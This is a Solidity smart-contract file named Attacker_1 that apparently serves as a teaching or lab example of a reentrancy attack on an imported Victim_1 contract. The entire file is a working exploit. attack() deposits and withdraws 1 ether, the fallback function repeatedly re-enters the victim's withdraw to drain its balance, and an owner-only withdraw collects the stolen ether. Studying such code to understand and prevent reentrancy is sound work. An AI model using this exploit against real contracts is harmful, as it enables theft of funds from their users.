//SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Victim_1.sol";

contract Attacker_1 {
    Victim_1 public immutable contract1;
    address _owner;

    constructor(Victim_1 contract1_) public {
        contract1 = contract1_;
        _owner = msg.sender;
    }

    fallback() external payable {
        if (address(contract1).balance >= 1 ether) {
            contract1.withdraw(1 ether);
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "invalid value");
        contract1.deposit{value : 1 ether}();
        contract1.withdraw(1 ether);
    }

    function withdraw() external {
        address sender = msg.sender;
        require(sender == _owner);
        payable(sender).transfer(address(this).balance);
    }

    // helper
    function getBalance() public view returns (uint){
        return address(this).balance;
    }
}
